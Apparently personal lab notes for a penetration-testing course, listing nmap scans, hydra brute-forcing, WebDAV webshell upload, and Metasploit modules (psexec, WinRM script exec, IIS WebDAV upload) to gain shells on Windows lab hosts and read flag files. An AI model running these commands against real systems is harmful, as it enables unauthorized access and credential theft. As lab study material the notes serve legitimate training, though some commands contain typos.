### Windows: IIS Server DAVTest
	commands 
	nmap -sV -sC ip -vvv
	nmap --script http-enum -sV -p80 ip
bruteforce with hydra without login credentials
	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ip http-get /webdav/ 
step 3 upload files on website with login credentials

	davtest -url http://ip/webdav
	davtest -auth bob:password_123321 -url http://ip/webdav

Step 4 upload .asp backdoor on the target machine to webdav directory using cadaver utility

	cadaver http://ip/webdav and enter the username:password
	Uploading asp backdoor to the IIS web server in webdav directory.
	put /usr/share/webshells/asp/webshell.asp
	ls
Step 5 go to the url http://ip/webdav and enter the login credentials bob:password_123321 and enter the webshell.asp
	dir C:\\
	type C:\\flag.txt


### Exploiting WebDAV with Metasploit
	commands
	nmap -sV -sC ip 
	nmap -sV -O
	davtest -url http://ip/webdav
	davtest -auth bob:password_123321 -url http://ip/webdav
	msfconsole -q
	use exploit/windows/iis/iis_webdav_upload_asp
	set RHOSTS ip
	set HttpUsername bob
	set HttpPassword password_123321
	set PATH /webdav/metasploit%RAND%.asp
	exploit
	shell
	cd /
	dir
	type C:\flag.txt


### Exploiting SMB with PsExec

$$cat /root/Desktop/target
$$

$$nmap ip
- nmap -p445 --script smb-protocols ip
- msfconsole -q
- use auxiliary/scanner/smb/smb_login
- set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
- set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
- set RHOSTS ip
- set VERBOSE false
- exploit
$$

< '- use exploit/window/smb/psexec'>
< '- set RHOSTS ip'>
< '- set SMBUser Administrator' >
< '- set SMBPass qwertyuiop' >
< '- exploit'

- shell
- cd /
- dir
- type flag.txt

### Windows: Insecure RDP Service

	- nmap ip
	- msfconsole
	- use auxiliary/scanner/rdp/rdp_scanner
	- set RHOSTS ip
	- set RPORT ip
	- exploit

	- hyrda -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://ip -s 3333

	- xfreerdp /u:administrator /p:qwertyuiop /v:ip:3333
	- searching for the flag in C:\\
	
#### WinRM: Exploitation with Metasploit

	- nmap --top-ports 7000 10.0.0.173
	- msfconsole -q
	use auxiliary/scanner/winrm/winrm_login
	set RHOSTS 10.0.0.173
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	set VERBOSE false
	exploit

	- use auxiliary/scanner/winrm/winrm_auth_methods
	set RHOSTS 10.0.0.173
	exploit
	
	- use auxiliary/scanner/winrm/winrm_cmd
	set RHOSTS 10.0.0.173
	set USERNAME administrator
	set PASSWORD tinkerbell
	set CMD whoami
	exploit
	
	- use exploit/windows/winrm/winrm_script_exec
	set RHOSTS 10.0.0.173
	set USERNAME administrator
	set PASSWORD tinkerbell
	set FORCE_VBS true
	exploit
	
	- cd /
	- dir
	- cat flag.txt
